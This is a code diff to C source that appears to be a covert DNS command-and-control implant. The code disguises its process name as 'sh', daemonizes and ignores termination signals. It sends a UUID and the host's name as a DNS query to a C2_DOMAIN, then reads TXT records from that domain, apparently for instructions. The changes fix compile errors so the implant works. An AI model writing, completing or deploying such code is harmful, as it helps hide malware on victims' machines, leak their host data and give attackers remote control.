@@ -19,7 +19,7 @@ int main(int argc, char **argv) {
         prctl(PR_SET_NAME, (unsigned long)"sh", 0, 0, 0);
         strncpy(argv[0], "sh", strlen(argv[0]));
     }
-    daemon(0, 0);
+    (void)daemon(0, 0);
     prctl(PR_SET_PDEATHSIG, SIGTERM);
     signal(SIGINT, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
@@ -34,17 +34,17 @@ int main(int argc, char **argv) {
     sprintf(data_query, "%s%s.%s", UUID, hostname, C2_DOMAIN);
     // printf("data_query: %s\n", data_query);
 
-    (void)query_a(data_query);
+    (void)query_a((unsigned char *)data_query);
 
-    unsigned char query[1024 + 33 + 257]
-    sprintf(query, "%s")
+    unsigned char query[1024 + 33 + 257];
+    sprintf((char *)query, "testing.%s", C2_DOMAIN);
 
-    unsigned char *txt_results = query_txt("test" + C2_DOMAIN);
+    unsigned char *txt_results = query_txt(query);
 
     if(txt_results) {
         printf("TXT records for %s:\n\n", hostname);
 
-        for(i = 0; txt_results[i] != NULL; i++) {
+        for(int i = 0; txt_results[i] != NULL; i++) {
             printf("TXT %d\n", i);
             printf("Data: %s\n", txt_results[i]);
 
